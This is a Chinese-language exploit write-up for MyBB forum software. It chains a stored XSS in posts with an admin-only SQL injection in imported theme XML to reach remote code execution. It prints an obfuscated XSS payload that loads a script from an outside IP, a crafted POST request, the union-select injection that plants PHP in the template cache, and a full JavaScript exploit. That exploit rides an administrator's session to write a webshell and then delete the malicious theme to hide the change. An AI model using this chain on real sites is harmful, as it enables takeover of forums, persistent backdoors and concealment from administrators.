**思考攻击步骤**
  1. 导入包含SQL注入paylaod 的 XML主题配置文件，使 `templateset` 为注入语句
  2. 切换 mybb 主题为新增的恶意主题，不然 `$theme` 无法切换到恶意的 `templateset`
  3. 访问首页即可 RCE
###  poc
**恶意主题文件：**
    ......
    ......
**导入恶意主题文件**
**切换当前主题为恶意主题**
**访问下首页：**
_调用到`cache()` 时，`theme['templateset']`的值：_
`cache()` 中执行的 SQL语句：
    SELECT title,template FROM mybb_templates 
    WHERE title IN (......) 
    AND sid IN ('-2','-1','999') 
    and 1=2 /* 强行使前面的语句返回空行 */
    union select 'header_welcomeblock_member_user','${phpinfo()}'
    #')
成功在 cache 中写入了恶意代码。
随后在 `global.php` 中调用了
    eval('$usercplink = "'.$templates->get('header_welcomeblock_member_user').'";');
在 `get()` 函数中，查询 `$this->cache`，存在对应的 `title` ，直接返回 `$this->cache[$title]`
最终返回到 eval 中执行，成功 RCE
不过由于我们篡改了开头的 SQL语句，所以 mybb会报错很正常。最好通过这个 RCE 写个马到 _cache_ 或者 _upload_
目录之后，就将主题还原。
###  两个漏洞结合使普通用户可 RCE
由于前文的 RCE 需要管理员权限，普通用户无法直接触发。但现在有了一个 XSS ，可以尝试 **通过 XSS 发送对应的 payload请求** 。
_ps：无法在前台处盗取 cookie，因为 mybb 设置了`SameSite`为 `Lax`_
**XSS**
根据前文的 XSS漏洞分析可知，我们无法直接使用引号、尖括号和中括号。经过尝试构造以下 XSS payload 以插入一个js标签
_ps：前文分析XSS时是在回复处分析的，实际上发帖处也存在XSS_
    //拿到 / 字符
    xs1=String.fromCharCode(47);
    //创建 script 元素
    xa1=document.createElement(/script/.source);
    //设置 script src属性
    xa1.src=xs1+xs1+/192.168.92.165/.source+xs1+/1.js/.source;
    //插入 script 标签
    document.getElementById(/header/.source).append(xa1);
数据包：
    POST /newthread.php?fid=2&processed=1 HTTP/1.1
    ......
    Content-Disposition: form-data; name="message"
    [img]http://evil.com/xx(http://evil.com/onerror=xs1=String.fromCharCode(47);xa1=document.createElement(/script/.source);xa1.src=xs1+xs1+/192.168.92.165/.source+xs1+/1.js/.source;document.getElementById(/header/.source).append(xa1);//[/img]   
    ......
成功插入后，编写恶意 js文件，执行以下操作：
  1. 获取后台当前的配置主题
  2. 导入恶意主题XML配置，RCE代码为往 cache 目录写一个马
  3. 设置当前主题为恶意主题
  4. 请求首页，触发 RCE
  5. 将当前主题设回原来的
  6. 删除恶意主题
以上的请求可以通过 javascript 的 xmlhttp 来实现，由于是 xss 也就不存在跨域的问题了。
**RCE JS EXP：**
修改下 SQL注入的payload。
我们目前要打的是管理员，但mybb中前台和后台的 Cookie 是分开验证，我们要考虑如下情况：
  1. 管理员前后台都登陆了
  2. 管理员前台登陆普通用户，后台登陆管理员
  3. 管理员前面没登陆，后台登陆管理员
三种情况对应着不一样的 `eval` 入口。
**管理员** 的第一个 eval 调用点为 _header_welcomeblock_member_admin_
**普通用户** 的第一个 eval 调用点为 _header_welcomeblock_member_user_
**匿名账户** 的第一个 eval 调用点为 header_welcomeblock_guest_login_modal*
    var bashurl = 'http://192.168.92.164/mybb/mybb-mybb_1825'
    var my_post_key = ''
    var source_theme = '';
    var evil_theme_set = ''
    var evil_theme_tid = ''
    function sleep (time) {
      return new Promise((resolve) => setTimeout(resolve, time));
    }
    function get_themes(){
        var url = bashurl + '/admin/index.php?module=style'
        var xhr=new XMLHttpRequest();
        xhr.open('GET',url,false);
        xhr.onreadystatechange=function(){
            if(xhr.readyState==4){
                if(xhr.status==200 || xhr.status==304){
                    var res = xhr.responseText;
                    var parser = new DOMParser();
                    var doc3 = parser.parseFromString(res, "text/html");
                    var source_theme_tid = '';
                    imgs = doc3.getElementsByTagName("img");
                    for(var i=0;icache 存在以下三个 title。才能确保一定能触发 RCE
        //header_welcomeblock_member_user  //普通用户的第一个 evil调用点
        //header_welcomeblock_member_admin //管理员用户的第一个 evil调用点
        //header_welcomeblock_guest_login_modal //匿名用户的第一个 evil调用点
        var content = [
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            ''
        ].join('\n');
        var blob = new Blob([content], { type: "text/xml"});
        formData.append("local_file", blob);
        var request = new XMLHttpRequest();
        request.open("POST", url);
        request.send(formData);
    }
    function set_evil_theme(){
        var url = bashurl + '/admin/index.php?module=style'
        var xhr=new XMLHttpRequest();
        xhr.open('GET',url,false);
        xhr.onreadystatechange=function(){
            if(xhr.readyState==4){
                if(xhr.status==200 || xhr.status==304){
                    var res = xhr.responseText;
                    var evil_theme = '';
                    var parser = new DOMParser();
                    var doc3 = parser.parseFromString(res, "text/html");
                    aTag = doc3.getElementsByTagName("a")
                     for(var i=0;i',false);
        xhr.send();
    }
    function clean(){
        // 重置默认主题
        var xhr1=new XMLHttpRequest();
        xhr1.open('GET',source_theme,false);
        xhr1.send();
        //删除恶意主题
        var xhr2 = new XMLHttpRequest();
        var formData = new FormData();
        var url = bashurl + '/admin/index.php?module=style-themes&action=delete&tid=' + evil_theme_tid
        formData.append("my_post_key", my_post_key);
        xhr2.open("POST", url);
        xhr2.send(formData);
    }
    //获取当前默认主题
    get_themes()
    //如果获取不到 csrf_token
    //说明不是 管理员访问
    if(my_post_key != ''){
        //导入恶意主题
        import_xml()
        sleep(300).then(() => {
            //设置恶意主题为当前默认主题
            set_evil_theme()
            //触发 RCE
            trigger_rce()
            //删除主题，还原默认主题
            clean()
        })
    }
**验证：**  
触发 XSS，恶意js发送的请求：
后台的模板管理没有变化：
成功写马：
#  Reference：